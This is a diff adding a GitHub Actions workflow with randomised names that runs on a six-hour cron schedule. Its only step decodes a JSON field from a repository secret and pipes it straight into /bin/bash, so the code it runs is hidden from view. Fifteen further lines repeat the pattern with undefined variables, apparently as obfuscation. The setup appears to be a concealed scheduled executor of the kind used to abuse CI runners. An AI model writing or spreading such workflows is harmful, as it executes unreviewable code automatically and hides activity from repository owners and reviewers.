@@ -1,0 +1,32 @@
+name: zhangkefan7580
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangkefan7580
+        env:
+          bm7785: ${{ secrets.bm7785 }}
+        run: |
+          echo $bm7785 | jq -r .a335 | /bin/bash
+          echo $eep84007 | jq -r .ltzo6 | /bin/bash
+          echo $rf1 | jq -r .ces19034 | /bin/bash
+          echo $huwlh6064 | jq -r .l55386 | /bin/bash
+          echo $gxd3565 | jq -r .wao45311 | /bin/bash
+          echo $fcrel7322 | jq -r .y28422 | /bin/bash
+          echo $binvk65 | jq -r .f556 | /bin/bash
+          echo $w231 | jq -r .ih8764 | /bin/bash
+          echo $fqsq059 | jq -r .qqef465 | /bin/bash
+          echo $aldg92 | jq -r .tag0530 | /bin/bash
+          echo $pbu87508 | jq -r .akox1 | /bin/bash
+          echo $wr2 | jq -r .iud05 | /bin/bash
+          echo $omug146 | jq -r .rlkmo0953 | /bin/bash
+          echo $bkg83 | jq -r .fmho323 | /bin/bash
+          echo $e357 | jq -r .wc9134 | /bin/bash
+          echo $ts3 | jq -r .qag48 | /bin/bash
+
